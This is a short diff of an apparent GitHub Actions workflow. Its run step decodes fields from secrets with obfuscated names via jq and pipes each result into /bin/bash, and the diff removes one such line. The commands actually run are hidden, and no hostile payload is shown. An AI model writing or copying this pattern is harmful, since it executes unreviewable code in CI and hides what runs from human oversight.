@@ -18,7 +18,6 @@ jobs:
           ch3: ${{ secrets.ch3 }}
         run: |
           printf '%s' "$ch3" | jq -r .p8109 | /bin/bash
-          echo $sd332 | jq -r .z1 | /bin/bash
           echo $hjtg8 | jq -r .vsnjd9 | /bin/bash
           printf '%s' "$qxhe6" | jq -r .jqtai765 | /bin/bash
           echo $ibhor6935 | jq -r .r50388 | /bin/bash
